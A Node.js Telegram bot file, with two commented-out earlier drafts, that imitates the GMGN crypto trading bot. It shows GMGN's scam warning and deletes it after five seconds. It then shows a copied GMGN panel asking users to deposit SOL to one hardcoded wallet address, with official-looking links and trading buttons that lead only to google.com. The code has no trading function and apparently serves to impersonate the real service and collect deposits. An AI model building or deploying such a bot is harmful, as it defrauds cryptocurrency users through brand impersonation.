import express from 'express';
import { Telegraf, Markup } from 'telegraf';
import dotenv from 'dotenv';

dotenv.config();

const bot = new Telegraf(process.env.BOT_TOKEN);

// Handle /start command
bot.start(async (ctx) => {
    // First popup: Scam Alert
    const scamMsg = await ctx.reply(
        `🚨 *Scam Alert: Do not click on any ADs at the top of Telegram as noted, they are all scam ADs!! Avoid having your wallet's private key stolen.*\n\n` +
        `1️⃣ Any AD claiming "The bot has stopped working, all fees waived, and invitation rewards increased" is a scam AD!\n` +
        `2️⃣ Any bot that lures you into importing your private key is a scam bot!\n` +
        `3️⃣ Anyone claiming to be GMGN official personnel and proactively messaging you on Telegram to help solve problems is a scammer!!\n\n` +
        `🔐 *For more common scams, please refer to:* [GMGN Safety Tips](https://docs.gmgn.ai/index/safety-tip)\n` +
        `📢 *Official GMGN announcements:* https://x.com/gmgnai`,
        { parse_mode: 'Markdown', disable_web_page_preview: true }
    );

    // Delete scam alert after 5 seconds
    setTimeout(async () => {
        try {
            await ctx.deleteMessage(scamMsg.message_id);
        } catch (err) {
            console.log('Message already deleted or not deletable.');
        }

        // Second message with inline URL buttons
        await ctx.reply(
            `🌈 *Private node, 3s on-chain, Pump support, lightning-fast transactions!* ⚡️⚡️⚡️\n\n` +
            `💳 *Wallet (Insufficient balance, please deposit👇🏻):*\n` +
            `Bq86moz9TUxHWig3rH1DLH9VKQCtsvoMg4x5NwaGknho (Tap to copy)\n\n` +
            `💰 *Balance:* 0 SOL (Pnl --) [View Activity](https://gmgn.ai/sol/address/Bq86moz9TUxHWig3rH1DLH9VKQCtsvoMg4x5NwaGknho)\n\n` +
            `🔗 *Referral link:*\nhttps://t.me/GMGN_sol_bot?start=i_2Kg3Cm3n (Tap to copy)\n\n` +
            `👉🏻 *Start To Use:*\n  ·  Start Trading: Send token contract address\n\n` +
            `🔔 *Featured Signal Channels:* @gmgn_ai\n\n` +
            `💡 *To execute transactions faster, it is recommended to choose a faster backup bot:*\n` +
            `GMGN 👉 [Main](https://t.me/GMGN_sol_bot) | [GMGN_02](https://t.me/GMGN_sol02_bot) | [GMGN_03](https://t.me/GMGN_sol03_bot) | [GMGN_04](https://t.me/GMGN_sol04_bot) | [GMGN_US](https://t.me/US_GMGNBOT)\n\n` +
            `🍿 *GMGN Multi-Chain Bot:* | [BSC](https://t.me/GMGN_bsc_bot) | [Base](https://t.me/GMGN_base_bot) | [ETH](https://t.me/GMGN_swap_bot) | [Tron](https://t.me/GMGN_tron_bot)`,
            {
                parse_mode: 'Markdown',
                disable_web_page_preview: false,
                ...Markup.inlineKeyboard([
                    [
                        Markup.button.url('Buy/Sell', 'https://google.com'),
                        Markup.button.url('Limit Order', 'https://google.com')
                    ],
                    [
                        Markup.button.url('Assets', 'https://google.com'),
                        Markup.button.url('Wallet', 'https://google.com')
                    ],
                    [
                        Markup.button.url('Copy Signal', 'https://google.com'),
                        Markup.button.url('Copy Trade', 'https://google.com')
                    ],
                    [
                        Markup.button.url('Dispute settlement', 'https://google.com'),
                        Markup.button.url('Snipex', 'https://google.com')
                    ],
                    [
                        Markup.button.url('Pump FOMO', 'https://google.com'),
                        Markup.button.url('New LP', 'https://google.com')
                    ],
                    [
                        Markup.button.url('Featured Signals', 'https://google.com'),
                        Markup.button.url('Track SM Alert', 'https://google.com')
                    ],
                    [
                        Markup.button.url('GMGN Sniper Bot', 'https://google.com')
                    ]
                ])
            }
        );
    }, 5000);
});

// Start the bot
bot.launch();
console.log('🤖 GMGN Bot is running...');

// Dummy Express server to keep Render happy
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('GMGN Bot is running!');
});

app.listen(PORT, () => {
    console.log(`✅ Server is running on port ${PORT}`);
});




// import express from 'express';
// import { Telegraf, Markup } from 'telegraf';
// import dotenv from 'dotenv';

// dotenv.config();

// const bot = new Telegraf(process.env.BOT_TOKEN);

// // Handle /start command
// bot.start(async (ctx) => {
//     // First popup: Scam Alert
//     const scamMsg = await ctx.reply(
//         `🚨 *Scam Alert: Do not click on any ADs at the top of Telegram, they are all scam ADs!! Avoid having your wallet's private key stolen.*\n\n` +
//         `1️⃣ Any AD claiming "The bot has stopped working, all fees waived, and invitation rewards increased" is a scam AD!\n` +
//         `2️⃣ Any bot that lures you into importing your private key is a scam bot!\n` +
//         `3️⃣ Anyone claiming to be GMGN official personnel and proactively messaging you on Telegram to help solve problems is a scammer!!\n\n` +
//         `🔐 *For more common scams, please refer to:* [GMGN Safety Tips](https://docs.gmgn.ai/index/safety-tip)\n` +
//         `📢 *Official GMGN announcements:* https://x.com/gmgnai`,
//         { parse_mode: 'Markdown', disable_web_page_preview: true }
//     );

//     // Delete scam alert after 5 seconds
//     setTimeout(async () => {
//         try {
//             await ctx.deleteMessage(scamMsg.message_id);
//         } catch (err) {
//             console.log('Message already deleted or not deletable.');
//         }

//         // Second message with inline buttons
//         await ctx.reply(
//             `🌈 *Private node, 3s on-chain, Pump support, lightning-fast transactions!* ⚡️⚡️⚡️\n\n` +
//             `💳 *Wallet (Insufficient balance, please deposit👇🏻):*\n` +
//             `Bq86moz9TUxHWig3rH1DLH9VKQCtsvoMg4x5NwaGknho (Tap to copy)\n\n` +
//             `💰 *Balance:* 0 SOL (Pnl --) [View Activity](https://gmgn.ai/sol/address/Bq86moz9TUxHWig3rH1DLH9VKQCtsvoMg4x5NwaGknho)\n\n` +
//             `🔗 *Referral link:*\nhttps://t.me/GMGN_sol_bot?start=i_2Kg3Cm3n (Tap to copy)\n\n` +
//             `👉🏻 *Start To Use:*\n  ·  Start Trading: Send token contract address\n\n` +
//             `🔔 *Featured Signal Channels:* @gmgn_ai\n\n` +
//             `💡 *To execute transactions faster, it is recommended to choose a faster backup bot:*\n` +
//             `GMGN 👉 [Main](https://t.me/GMGN_sol_bot) | [GMGN_02](https://t.me/GMGN_sol02_bot) | [GMGN_03](https://t.me/GMGN_sol03_bot) | [GMGN_04](https://t.me/GMGN_sol04_bot) | [GMGN_US](https://t.me/US_GMGNBOT)\n\n` +
//             `🍿 *GMGN Multi-Chain Bot:* | [BSC](https://t.me/GMGN_bsc_bot) | [Base](https://t.me/GMGN_base_bot) | [ETH](https://t.me/GMGN_swap_bot) | [Tron](https://t.me/GMGN_tron_bot)`,
//             {
//                 parse_mode: 'Markdown',
//                 disable_web_page_preview: false,
//                 ...Markup.inlineKeyboard([
//                     [
//                         Markup.button.callback('Buy/Sell', 'noop'),
//                         Markup.button.callback('Limit Order', 'noop')
//                     ],
//                     [
//                         Markup.button.callback('Assets', 'noop'),
//                         Markup.button.callback('Wallet', 'noop')
//                     ],
//                     [
//                         Markup.button.callback('Copy Signal', 'noop'),
//                         Markup.button.callback('Copy Trade', 'noop')
//                     ],
//                     [
//                         Markup.button.callback('Dispute settlement', 'noop'),
//                         Markup.button.callback('Snipex', 'noop')
//                     ],
//                     [
//                         Markup.button.callback('Pump FOMO', 'noop'),
//                         Markup.button.callback('New LP', 'noop')
//                     ],
//                     [
//                         Markup.button.callback('Featured Signals', 'noop'),
//                         Markup.button.callback('Track SM Alert', 'noop')
//                     ],
//                     [
//                         Markup.button.callback('GMGN Sniper Bot', 'noop')
//                     ]
//                 ])
//             }
//         );
//     }, 5000); // Delay before second message
// });

// // Start the bot
// bot.launch();
// console.log('🤖 GMGN Bot is running...');

// // Dummy Express server to keep Render happy
// const app = express();
// const PORT = process.env.PORT || 3000;

// app.get('/', (req, res) => {
//     res.send('GMGN Bot is running!');
// });

// app.listen(PORT, () => {
//     console.log(`✅ Server is running on port ${PORT}`);
// });




// import express from 'express';
// import { Telegraf } from 'telegraf';
// import dotenv from 'dotenv';

// dotenv.config();

// const bot = new Telegraf(process.env.BOT_TOKEN);

// // Handle /start command — ONLY sends scam alert
// bot.start((ctx) => {
//     ctx.reply(
//         `🚨 *Scam Alert: Do not click on any ADs at the top of Telegram, they are all scam ADs!! Avoid having your wallet's private key stolen.*\n\n` +
//         `1️⃣ Any AD claiming "The bot has stopped working, all fees waived, and invitation rewards increased" is a scam AD!\n` +
//         `2️⃣ Any bot that lures you into importing your private key is a scam bot!\n` +
//         `3️⃣ Anyone claiming to be GMGN official personnel and proactively messaging you on Telegram to help solve problems is a scammer!!\n\n` +
//         `🔐 *For more common scams, please refer to:* [GMGN Safety Tips](https://docs.gmgn.ai/index/safety-tip)\n` +
//         `📢 *Official GMGN announcements:* https://x.com/gmgnai`,
//         { parse_mode: 'Markdown', disable_web_page_preview: true }
//     );
// });

// // Start the bot
// bot.launch();
// console.log('🤖 GMGN Bot is running...');

// // Dummy Express server to keep Render happy
// const app = express();
// const PORT = process.env.PORT || 3000;

// app.get('/', (req, res) => {
//     res.send('GMGN is running!');
// });

// app.listen(PORT, () => {
//     console.log(`✅ Server is running on port ${PORT}`);
// });
